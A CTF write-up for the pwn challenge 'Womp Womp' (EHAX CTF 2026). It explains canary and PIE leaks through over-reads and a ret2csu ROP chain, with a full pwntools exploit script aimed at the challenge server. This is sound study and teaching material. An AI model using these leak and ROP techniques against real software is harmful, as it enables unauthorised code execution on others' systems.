---
title: "[Pwn] Womp Womp"
description: Writeup for "Womp Womp" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Pwn]
toc: true
comments: false
---

# Womp Womp (EHAX CTF 2026)

---

- **Name:** Womp Womp
- **Category:** Pwn
- **Description:** Hippity hoppity the flag is not your property
- **Difficulty:** â˜…â˜†â˜†â˜†â˜†

---

## TL;DR

Three-stage exploit:
1. **Info Leak #1** â€” `submit_note` reads 64 bytes but prints 88 bytes â†’ leaks **stack canary** and **saved rbp**
2. **Info Leak #2** â€” `review_note` reads 32 bytes but prints 48 bytes â†’ leaks a code pointer â†’ defeats **PIE**
3. **Stack Buffer Overflow** â€” `finalize_entry` reads 400 bytes into a 64-byte buffer â†’ **ret2csu** ROP chain calls `emit_report(0xdeadbeef..., 0xcafebabe..., 0xd00df00d...)` â†’ reads `flag.txt`

---

## Overview

### Files

```
handout/
â”œâ”€â”€ challenge       # 64-bit ELF, PIE + Stack Canary, dynamically linked
â””â”€â”€ libcoreio.so    # custom shared library, contains emit_report()
```

### Protections

```bash
$ checksec challenge
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Two protections we need to beat:
- **Stack Canary** â€” a random secret value placed above the saved return address. If we overwrite it, the program crashes on purpose.
- **PIE (Position Independent Executable)** â€” the program loads at a random base address every run, so we cannot hardcode any addresses.

### Program Flow

```
main()
  â””â”€ bootstrap_state()  â† calls emit_report(0,0,0) which just exits; not useful
  â””â”€ submit_note()       â† [VULN 1] over-read
  â””â”€ review_note()       â† [VULN 2] over-read
  â””â”€ finalize_entry()    â† [VULN 3] stack buffer overflow
```

### The Prize â€” `emit_report()` in `libcoreio.so`

```c
// Pseudocode
void emit_report(uint64_t a, uint64_t b, uint64_t c) {
    if (a == 0xdeadbeefdeadbeef &&
        b == 0xcafebabecafebabe &&
        c == 0xd00df00dd00df00d) {
        // Open flag.txt and print it to stdout
        int fd = open("flag.txt", O_RDONLY);
        read(fd, buf, 0x100);
        write(1, buf, bytes_read);
        _exit(0);
    }
    write(1, "Invalid request.\n", 17);
    _exit(1);
}
```

If we call `emit_report` with those three magic values, we get the flag.
The challenge is setting up all three arguments â€” especially `rdx` â€” while bypassing canary and PIE.

---

## Solution

### 1) Recon

#### submit_note â€” reading more than it wrote

```c
void submit_note() {
    char buf[0x50];             // 80-byte buffer
    read(0, buf, 0x40);         // reads  64 bytes
    write(1, buf, 0x58);        // prints 88 bytes  â† BUG
}
```

The stack layout inside `submit_note`:

```
  [rbp - 0x50]  buf starts here
  [rbp - 0x08]  canary             (offset +0x48 from buf)
  [rbp + 0x00]  saved rbp of main  (offset +0x50 from buf)
```

`read()` fills `buf[0..63]`. Then `write()` prints 88 bytes starting from the same pointer. That means it prints our 64 bytes **plus 24 extra bytes** beyond the buffer â€” which includes the canary and the saved rbp. No overflow needed; this is a pure **over-read leak**.

#### review_note â€” leaking a code pointer

```c
void review_note() {
    void *fn_ptr = &finalize_note;  // stored on the stack
    char buf[0x20];                 // 32-byte buffer
    read(0, buf, 0x20);             // reads  32 bytes
    write(1, buf, 0x30);            // prints 48 bytes  â† BUG
}
```

Stack layout:

```
  [rbp - 0x30]  buf starts here
  [rbp - 0x10]  fn_ptr = address of finalize_note  (offset +0x20 from buf)
  [rbp - 0x08]  canary                              (offset +0x28 from buf)
```

After filling 32 bytes, `write()` prints 16 more bytes which includes `fn_ptr`. Since `finalize_note` is always at a fixed offset (`0x980`) from the PIE base, we can calculate:

```
pie_base = leaked_fn_ptr - 0x980
```

Now we know every function's real address at runtime.

#### finalize_entry â€” the overflow

```c
void finalize_entry() {
    char buf[0x50];                   // 80-byte buffer (actually 72 bytes usable)
    buf[0] = 0;                       // program zeroes the first 8 bytes
    read(0, buf + 8, 0x190);          // reads 400 bytes into remaining space  â† BUG
}
```

Stack layout:

```
  [rbp - 0x50]  buf[0]     (set to 0 by program)
  [rbp - 0x48]  buf[8]     â† our input STARTS HERE
  [rbp - 0x08]  canary
  [rbp + 0x00]  saved rbp
  [rbp + 0x08]  return address  â† overwrite this with ROP chain
```

400 bytes is way more than needed to reach the return address. This is our write primitive.

---

### 2) Root Cause

| Vulnerability | Function | Type | What we get |
|---|---|---|---|
| Over-read | `submit_note` | `write(buf, 0x58)` but buf is 0x50 | canary + main's rbp |
| Over-read | `review_note` | `write(buf, 0x30)` but buf is 0x28 | PIE base address |
| Buffer Overflow | `finalize_entry` | `read(buf+8, 0x190)` but buf is 0x50 | control RIP |

All three bugs share the same root cause: **the size passed to `read`/`write` does not match the actual buffer size.**

---

### 3) Exploit

#### Step 1 â€” Leak canary and stack address

Send exactly 64 `A` bytes to `submit_note`. The print will include whatever is sitting beyond the buffer on the stack.

```python
r.recvuntil(b"Input log entry: ")
r.send(b'A' * 0x40)

r.recvuntil(b"[LOG] Entry received: ")
leak1  = r.recv(0x58)

canary = u64(leak1[0x48:0x50])   # stack canary value
bs_rbp = u64(leak1[0x50:0x58])   # main's saved rbp = stack anchor
```

#### Step 2 â€” Leak PIE base

Send exactly 32 `B` bytes to `review_note`. The print will include `fn_ptr`.

```python
r.recvuntil(b"Input processing note: ")
r.send(b'B' * 0x20)

r.recvuntil(b"[PROC] Processing: ")
leak2    = r.recv(0x30)

fn_ptr   = u64(leak2[0x20:0x28])
pie_base = fn_ptr - 0x980         # finalize_note is always at offset 0x980
```

#### Step 3 â€” ret2csu ROP chain

**Why do we need ret2csu?**

To call `emit_report(rdi, rsi, rdx)`, we need to control three registers. Common `pop rdi; ret` and `pop rsi; ret` gadgets exist in the binary. But there is **no `pop rdx; ret` gadget**. This is a classic problem in 64-bit exploits.

The solution is **ret2csu**: reuse code from `__libc_csu_init`, a function that exists in almost every Linux binary. It contains two useful gadget sequences:

**Gadget 1** (at offset `0xc9a`) â€” loads values into r12â€“r15:
```asm
pop rbx    ; rbx = 0
pop rbp    ; rbp = 1
pop r12    ; r12 = pointer to a function we want to call
pop r13    ; r13 â†’ will become rdx
pop r14    ; r14 â†’ will become rsi
pop r15    ; r15 â†’ will become edi (lower 32 bits of rdi)
ret
```

**Gadget 2** (at offset `0xc80`) â€” moves the values into argument registers and calls a function:
```asm
mov rdx, r13     ; rdx = our magic value
mov rsi, r14     ; rsi = our magic value
mov edi, r15d    ; edi = 0 (we set rdi properly later)
call [r12]       ; calls the function pointed to by r12
```

We point `r12` at the address of `finalize_note` on the stack. `finalize_note` is a completely empty function (just `push rbp; pop rbp; ret`), so calling it does nothing â€” but it lets us keep the `rdx` and `rsi` values we just set.

After Gadget 2 finishes, there is cleanup code that pops 7 values. Then we chain a `pop rdi; ret` gadget (found at offset `0xca3`, a misaligned read of the `pop r15; ret` bytes `41 5f c3`) to finally set `rdi`.

**Complete ROP chain:**

```
[csu gadget1]         â†’ pop rbx=0, rbp=1, r12=&fn_ptr_on_stack,
                         r13=0xd00df00dd00df00d (rdx),
                         r14=0xcafebabecafebabe (rsi),
                         r15=0
[csu gadget2]         â†’ rdx = r13, rsi = r14, call finalize_note (no-op)
[7 Ã— 0x0]             â†’ cleanup pops consumed
[pop rdi; ret]        â†’ rdi = 0xdeadbeefdeadbeef
[emit_report@plt]     â†’ open("flag.txt") â†’ print â†’ done
```

**Full payload structure sent to `finalize_entry`:**

```
offset 0x00  â”‚ address of finalize_note  â”‚  â† r12 dereferences here â†’ no-op call
offset 0x08  â”‚ padding (0x38 bytes)      â”‚
offset 0x40  â”‚ canary value              â”‚  â† must match leaked canary exactly
offset 0x48  â”‚ 0x0 (fake saved rbp)      â”‚
offset 0x50  â”‚ ROP chain starts          â”‚  â† overwritten return address
```

**Note on `fe_rbp` calculation:**

We place `finalize_note`'s address at `payload_start = fe_rbp - 0x48`. `fe_rbp` is `finalize_entry`'s frame base pointer. To find it from the leaked `bs_rbp` (main's rbp):

```
main has no sub rsp, so rsp == main_rbp == bs_rbp when it calls finalize_entry

call finalize_entry  â†’  push ret_addr  â†’  rsp = bs_rbp - 0x08
finalize_entry:
  push rbp           â†’  rsp = bs_rbp - 0x10
  mov rbp, rsp       â†’  fe_rbp = bs_rbp - 0x10
```

---

### 4) Why It Works

Let's walk through the full chain one more time from start to finish.

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 1. submit_note                                                   â”‚
â”‚                                                                  â”‚
â”‚    We fill the buffer exactly to its end.                        â”‚
â”‚    write() prints beyond the buffer â†’ we steal canary + rbp.    â”‚
â”‚    Now we know the secret canary and a stack address.            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â”‚
                            â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 2. review_note                                                   â”‚
â”‚                                                                  â”‚
â”‚    We fill the buffer exactly to its end.                        â”‚
â”‚    write() prints beyond â†’ we steal a code pointer.             â”‚
â”‚    pie_base = leaked_ptr - 0x980 â†’ all function addresses known. â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                            â”‚
                            â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ 3. finalize_entry                                                â”‚
â”‚                                                                  â”‚
â”‚    We send a crafted 224-byte payload.                           â”‚
â”‚                                                                  â”‚
â”‚    [finalize_note addr][padding][canary][fake rbp][ROP chain]   â”‚
â”‚                                                                  â”‚
â”‚    Canary passes the check (we use the real stolen value).       â”‚
â”‚    Function returns â†’ CPU jumps to our ROP chain.               â”‚
â”‚                                                                  â”‚
â”‚    ROP chain:                                                    â”‚
â”‚      csu gadget1 â†’ load rdx and rsi magic values into r13/r14   â”‚
â”‚      csu gadget2 â†’ move r13â†’rdx, r14â†’rsi, call no-op function   â”‚
â”‚      pop rdi     â†’ set rdi magic value                          â”‚
â”‚      emit_report â†’ three magic args match â†’ flag printed ğŸš©     â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Why does the no-op call trick work for `rdx`?**

`rdx` is a volatile register, meaning any function call can change it. If we called a real function after setting `rdx`, it might overwrite `rdx` with something else before we reach `emit_report`. By calling `finalize_note` â€” which only does `push rbp; pop rbp; ret` â€” we preserve the `rdx` value we just loaded. It is a dummy call just to satisfy the `call [r12]` instruction in csu gadget2 without corrupting our setup.

**Why is the misaligned `pop rdi; ret` gadget valid?**

x86-64 has variable-length instructions. The bytes `41 5f c3` decode as `pop r15; ret`. But if we jump to the second byte (`5f c3`), the CPU reads `pop rdi; ret` â€” a completely different instruction. This is not a bug; it is a valid execution path. ROP exploits commonly use these "misaligned" gadgets to get instructions the linker never intended to exist.

---

## Solver

```python
#!/usr/bin/env python3
from pwn import *

HOST = "20.244.7.184"
PORT = 1337

# Offsets inside the binary (PIE-relative)
OFF_FINALIZE_NOTE = 0x980
OFF_POP_RDI_RET   = 0xca3   # misaligned gadget: 5f c3
OFF_CSU_GADGET1   = 0xc9a   # pop rbx; rbp; r12; r13; r14; r15; ret
OFF_CSU_GADGET2   = 0xc80   # mov rdx,r13; mov rsi,r14; call [r12]
OFF_EMIT_PLT      = 0x838

# Magic values required by emit_report
RDI_MAGIC = 0xdeadbeefdeadbeef
RSI_MAGIC = 0xcafebabecafebabe
RDX_MAGIC = 0xd00df00dd00df00d

context.arch = 'amd64'
context.log_level = 'info'

def exploit():
    r = remote(HOST, PORT)

    # â”€â”€ Step 1: steal canary + main's rbp â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    r.recvuntil(b"Input log entry: ")
    r.send(b'A' * 0x40)

    r.recvuntil(b"[LOG] Entry received: ")
    leak1  = r.recv(0x58)
    r.recv(1)

    canary = u64(leak1[0x48:0x50])
    bs_rbp = u64(leak1[0x50:0x58])
    log.success(f"Canary : {hex(canary)}")
    log.success(f"bs_rbp : {hex(bs_rbp)}")

    # â”€â”€ Step 2: steal PIE base â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    r.recvuntil(b"Input processing note: ")
    r.send(b'B' * 0x20)

    r.recvuntil(b"[PROC] Processing: ")
    leak2    = r.recv(0x30)
    r.recv(1)

    fn_ptr   = u64(leak2[0x20:0x28])
    pie_base = fn_ptr - OFF_FINALIZE_NOTE
    log.success(f"PIE base : {hex(pie_base)}")

    # â”€â”€ Step 3: build ROP chain and overflow â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
    # finalize_entry's frame base:
    #   main has no sub rsp â†’ rsp == bs_rbp when calling finalize_entry
    #   call  â†’ push ret_addr â†’ rsp = bs_rbp - 8
    #   push rbp              â†’ rsp = bs_rbp - 16
    #   fe_rbp = bs_rbp - 0x10
    fe_rbp        = bs_rbp - 0x10
    payload_start = fe_rbp - 0x48   # where our input begins on the stack

    rop  = p64(pie_base + OFF_CSU_GADGET1)  # gadget1: load r12-r15
    rop += p64(0)                            # rbx = 0
    rop += p64(1)                            # rbp = 1  (loop once)
    rop += p64(payload_start)               # r12 â†’ [payload_start] = finalize_note addr
    rop += p64(RDX_MAGIC)                   # r13 â†’ rdx
    rop += p64(RSI_MAGIC)                   # r14 â†’ rsi
    rop += p64(0)                            # r15 â†’ edi (don't care)
    rop += p64(pie_base + OFF_CSU_GADGET2)  # gadget2: set rdx/rsi, call no-op
    rop += p64(0) * 7                        # consume csu cleanup pops
    rop += p64(pie_base + OFF_POP_RDI_RET)  # pop rdi; ret
    rop += p64(RDI_MAGIC)                   # rdi = 0xdeadbeefdeadbeef
    rop += p64(pie_base + OFF_EMIT_PLT)     # emit_report â†’ flag!

    payload  = p64(pie_base + OFF_FINALIZE_NOTE)  # offset 0x00: no-op fn addr for r12
    payload += b'C' * (0x40 - 8)                  # padding to canary
    payload += p64(canary)                         # canary (must match exactly)
    payload += p64(0)                              # fake saved rbp
    payload += rop

    r.recvuntil(b"Send final payload: ")
    r.send(payload)

    result = r.recvall(timeout=3)
    log.success(f"Output:\n{result.decode(errors='replace')}")

if __name__ == '__main__':
    exploit()
```
---
<img width="1324" height="401" alt="ìŠ¤í¬ë¦°ìƒ· 2026-02-28 073242" src="https://github.com/user-attachments/assets/d8187731-1025-49a9-a753-e6b0ab3e0a4d" />
---
